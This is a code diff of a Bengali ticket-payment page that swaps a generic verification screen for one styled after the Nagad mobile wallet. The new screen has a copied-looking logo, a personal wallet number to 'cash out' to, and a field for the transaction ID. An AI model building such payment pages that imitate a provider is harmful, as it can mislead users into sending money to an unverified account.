@@ -39,12 +39,11 @@ body {
   padding-bottom: 90px;
 }
 .main-wrapper {
-  background: rgba(15, 33, 46, 0.85);
-  backdrop-filter: blur(10px);
-  border: 1px solid rgba(31, 81, 255, 0.2);
-  border-radius: 24px;
-  padding: 20px;
-  box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+  background: #ffffff;
+  color: #111827;
+  border-radius: 16px;
+  padding: 16px;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.3);
 }
 .input-group {
   position: relative;
@@ -52,17 +51,17 @@ body {
 }
 .input-group input {
   width: 100%;
-  background: rgba(13, 27, 38, 0.8);
-  border: 1px solid rgba(31, 81, 255, 0.4);
-  border-radius: 12px;
+  background: #f9fafb;
+  border: 1px solid #d1d5db;
+  border-radius: 8px;
   padding: 12px 16px;
-  color: #FFFFFF;
+  color: #111827;
   font-size: 14px;
   outline: none;
   transition: border-color 0.2s;
 }
 .input-group input:focus {
-  border-color: #1F51FF;
+  border-color: #ef4444;
 }
 .toast {
   position: fixed;
@@ -70,7 +69,7 @@ body {
   bottom: 80px;
   left: 50%;
   transform: translateX(-50%);
-  background: var(--button);
+  background: #ef4444;
   color: white;
   border-radius: 12px;
   padding: 10px 20px;
@@ -90,46 +89,68 @@ body {
 
 <div class="app">
   <div class="main-wrapper">
-    <div class="w-full bg-[#1F51FF] text-white font-bold py-3 px-4 rounded-xl flex items-center justify-center gap-2 mb-4 shadow-md text-sm">
-      <i class="fa-solid fa-shield-halved"></i>
-      <span>E-Payment Verification</span>
+    <!-- Top Amount Header -->
+    <div class="bg-[#008751] text-white p-3 rounded-t-lg -mx-4 -mt-4 mb-4 flex justify-between items-center">
+      <div>
+        <h2 class="text-xl font-bold" id="headerAmount">BDT 0</h2>
+        <p class="text-xs text-gray-100">কম বা বেশি করবেন না সেন্ড মানি</p>
+      </div>
+      <div class="bg-black/30 px-2 py-1 rounded text-xs">PAY SERVICE</div>
     </div>
 
-    <!-- Payment Info Summary -->
-    <div class="mb-4 bg-[#1a2c38]/80 p-4 rounded-xl border border-blue-500/20 text-sm space-y-2">
-      <div class="flex justify-between">
-        <span class="text-gray-400">Buyer Name:</span>
-        <span id="summaryName" class="font-semibold text-white">Loading...</span>
+    <!-- Warning Text -->
+    <p class="text-red-600 text-xs font-semibold mb-3 leading-relaxed text-center">
+      আপনি যদি টাকার পরিমাণ পরিবর্তন করেন (<span id="warnAmount">BDT 0</span>), আপনি ক্রেডিট পেতে সক্ষম হবেন না।
+    </p>
+
+    <!-- Deposit Method Box -->
+    <div class="bg-[#f24e39] text-white p-3 rounded-xl flex items-center gap-3 mb-4 shadow-sm">
+      <div class="bg-white p-2 rounded-lg flex items-center justify-center w-12 h-12 shrink-0">
+        <!-- Nagad SVG Logo -->
+        <svg viewBox="0 0 500 500" class="w-8 h-8">
+          <circle cx="250" cy="250" r="250" fill="#f24e39"/>
+          <path d="M220 140c-35 0-65 25-70 60h40c5-15 20-25 35-25 20 0 35 15 35 35v15h-30c-35 0-60 20-60 50 0 30 25 50 55 50 25 0 45-15 50-35h35c-5 40-40 70-85 70-55 0-95-40-95-95 0-55 40-95 95-95 40 0 75 25 85 60h-40c-8-18-25-30-45-30z" fill="#fff"/>
+        </svg>
       </div>
-      <div class="flex justify-between">
-        <span class="text-gray-400">Mobile Number:</span>
-        <span id="summaryMobile" class="font-semibold text-white">Loading...</span>
-      </div>
-      <div class="flex justify-between border-t border-gray-700 pt-2">
-        <span class="text-gray-400">Amount to Pay:</span>
-        <span id="summaryAmount" class="font-bold text-emerald-400">0.00 BDT</span>
+      <div>
+        <h3 class="font-bold text-base">নগদ Deposit</h3>
+        <p class="text-xs text-red-100">সঠিক নিয়মে পেমেন্ট সম্পন্ন করুন</p>
       </div>
     </div>
 
-    <!-- Payment Instruction Box -->
-    <div class="mb-4 bg-[#0d1b26] p-3 rounded-xl border border-blue-500/30 text-xs text-gray-300">
-      <p class="font-semibold text-blue-400 mb-1"><i class="fa-solid fa-info-circle"></i> Payment Instructions:</p>
-      <p>দয়া করে আমাদের বিকাশ/নগদ মার্চেন্ট নম্বরে (01700000000) উপরোক্ত পরিমাণ টাকা Send Money বা Payment করুন এবং প্রাপ্ত Trx ID নিচে প্রদান করুন।</p>
+    <!-- Wallet Number Section -->
+    <div class="mb-3">
+      <label class="block text-xs font-bold text-gray-800 mb-1">Wallet No<span class="text-red-500">*</span></label>
+      <p class="text-[11px] text-gray-600 mb-1">এই নগদ নাম্বারে শুধুমাত্র সেন্ড মানি গ্রহণ করা হয়</p>
+      <div class="flex items-center bg-gray-100 border border-gray-300 rounded-lg p-2.5 justify-between">
+        <span id="walletNumber" class="font-mono font-bold text-gray-800 text-base">01878803186</span>
+        <button onclick="copyWallet()" class="text-emerald-700 hover:text-emerald-800 px-2">
+          <i class="fa-regular fa-copy text-lg"></i>
+        </button>
+      </div>
     </div>
 
+    <!-- TrxID Input Section -->
     <form id="verificationForm" onsubmit="submitPaymentVerification(event)">
-      <!-- Transaction ID Input -->
       <div class="input-group">
-        <label class="block text-xs text-gray-400 mb-1">Transaction ID (Trx ID)</label>
-        <input type="text" id="trxId" placeholder="Enter Transaction ID" required>
+        <label class="block text-xs font-bold text-gray-800 mb-1">
+          ক্যাশআউটের TrxID নাম্বারটি লিখুন <span class="text-red-600">(প্রয়োজন)</span>
+        </label>
+        <input type="text" id="trxId" placeholder="TrxID অবশ্যই পূরণ করতে হবে!" required class="border-red-500 focus:border-red-600">
       </div>
 
       <!-- Submit Button -->
-      <button type="submit" id="verifyBtn" class="w-full mt-2 bg-[#1F51FF] hover:bg-blue-600 text-white font-bold py-3.5 px-6 rounded-xl flex items-center justify-center gap-2 transition-all shadow-lg active:scale-98 text-sm">
-        <i class="fa-solid fa-check-circle"></i>
-        <span>Verify & Buy Ticket</span>
+      <button type="submit" id="verifyBtn" class="w-full bg-white border border-gray-400 hover:bg-gray-50 text-gray-800 font-bold py-3 px-6 rounded-xl flex items-center justify-center gap-2 transition-all shadow-sm text-sm">
+        <span>নিশ্চিত</span>
       </button>
     </form>
+
+    <!-- Bottom Warning Footer -->
+    <div class="mt-4 border-t border-gray-200 pt-3 text-[11px] text-gray-600">
+      <p class="font-bold text-gray-800 mb-1">সতর্কতা:</p>
+      <p class="text-red-600 mb-1">লেনদেন আইডি সঠিকভাবে পূরণ করতে হবে, অন্যথায় স্কোর ব্যর্থ হবে!</p>
+      <p>অনুগ্রহ করে নিশ্চিত হয়ে নিন যে আপনি নগদ ডিপোজিট ওয়ালেট নাম্বারে ক্যাশ আউট করছেন।</p>
+    </div>
   </div>
 </div>
 
@@ -169,6 +190,12 @@ body {
     window.toastTimer = setTimeout(() => toast.classList.remove('show'), 2500);
   }
 
+  function copyWallet() {
+    const walletText = document.getElementById('walletNumber').textContent;
+    navigator.clipboard.writeText(walletText);
+    notify('ওয়ালেট নম্বর কপি করা হয়েছে!');
+  }
+
   let ticketData = null;
 
   window.addEventListener('DOMContentLoaded', async () => {
@@ -185,9 +212,8 @@ body {
 
     ticketData = JSON.parse(storedData);
 
-    document.getElementById('summaryName').textContent = ticketData.buyerName;
-    document.getElementById('summaryMobile').textContent = ticketData.buyerMobile;
-    document.getElementById('summaryAmount').textContent = ticketData.priceAmount + ' BDT';
+    document.getElementById('headerAmount').textContent = 'BDT ' + ticketData.priceAmount;
+    document.getElementById('warnAmount').textContent = 'BDT ' + ticketData.priceAmount;
   });
 
   async function submitPaymentVerification(event) {
@@ -231,7 +257,7 @@ body {
 
       if (ticketError) throw ticketError;
 
-      // ২. ticket_prices টেবিলে প্রাইস এবং স্ট্যাটাস রেকর্ড ইনসার্ট করা
+      // ২. ticket_prices টেবিলে প্রাইস রেকর্ড ইনসার্ট করা
       const { error: priceError } = await client
         .from('ticket_prices')
         .insert([
@@ -245,7 +271,6 @@ body {
 
       if (priceError) {
         console.error('Price table insert error:', priceError);
-        // প্রাইস ইনসার্টে সমস্যা হলেও মূল টিকিট প্রসেস যেন আটকে না যায়
       }
 
       localStorage.removeItem('pending_ticket_data');
@@ -260,7 +285,7 @@ body {
       console.error('Verification error:', err);
       notify('টেকনিক্যাল সমস্যার কারণে ভেরিফিকেশন সম্পন্ন হয়নি।');
       verifyBtn.disabled = false;
-      verifyBtn.innerHTML = `<i class="fa-solid fa-check-circle"></i><span>Verify & Buy Ticket</span>`;
+      verifyBtn.textContent = 'নিশ্চিত';
     }
   }
 </script>
